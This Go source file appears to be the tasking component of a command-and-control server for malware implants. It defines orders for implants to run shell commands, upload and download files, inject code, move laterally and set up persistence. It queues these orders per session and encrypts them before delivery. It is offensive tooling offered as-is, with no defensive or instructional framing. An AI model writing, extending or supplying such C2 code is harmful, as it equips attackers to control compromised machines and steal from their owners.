package main

import (
	"crypto/rand"
	"io"
	"sync"
	"time"

	"golang.org/x/crypto/chacha20poly1305"
)

type TaskType uint8

const (
	TaskNone      TaskType = 0
	TaskShell     TaskType = 1
	TaskUpload    TaskType = 2
	TaskDownload  TaskType = 3
	TaskInject    TaskType = 4
	TaskLateral   TaskType = 5
	TaskPersist   TaskType = 6
	TaskSleep     TaskType = 7
	TaskExit      TaskType = 8
	TaskPlugin    TaskType = 9
	TaskKeyRotate TaskType = 10
)

// Task is a command queued for an implant
type Task struct {
	ID        [16]byte
	Type      TaskType
	Data      []byte
	CreatedAt time.Time
	Timeout   time.Duration
}

// TaskManager queues tasks for implants and collects results
type TaskManager struct {
	mu      sync.RWMutex
	pending map[string][]*Task
}

func NewTaskManager() *TaskManager {
	return &TaskManager{
		pending: make(map[string][]*Task),
	}
}

// Enqueue adds a task for a session
func (tm *TaskManager) Enqueue(sessionHexID string, taskType TaskType, data []byte, timeout time.Duration) (*Task, error) {
	var taskID [16]byte
	if _, err := io.ReadFull(rand.Reader, taskID[:]); err != nil {
		return nil, err
	}
	task := &Task{
		ID:        taskID,
		Type:      taskType,
		Data:      data,
		CreatedAt: time.Now(),
		Timeout:   timeout,
	}
	tm.mu.Lock()
	tm.pending[sessionHexID] = append(tm.pending[sessionHexID], task)
	tm.mu.Unlock()
	return task, nil
}

// Dequeue returns the next pending task for a session
func (tm *TaskManager) Dequeue(sessionHexID string) *Task {
	tm.mu.Lock()
	defer tm.mu.Unlock()
	tasks := tm.pending[sessionHexID]
	if len(tasks) == 0 {
		return nil
	}
	task := tasks[0]
	tm.pending[sessionHexID] = tasks[1:]
	if len(tm.pending[sessionHexID]) == 0 {
		delete(tm.pending, sessionHexID)
	}
	return task
}

// EncryptTask serializes and encrypts a task with the session key
func EncryptTask(task *Task, sessionKey *[32]byte) ([]byte, error) {
	aead, err := chacha20poly1305.NewX(sessionKey[:])
	if err != nil {
		return nil, err
	}
	plaintext := append(task.ID[:], byte(task.Type))
	plaintext = append(plaintext, task.Data...)
	nonce := make([]byte, aead.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, err
	}
	return aead.Seal(nonce, nonce, plaintext, nil), nil
}
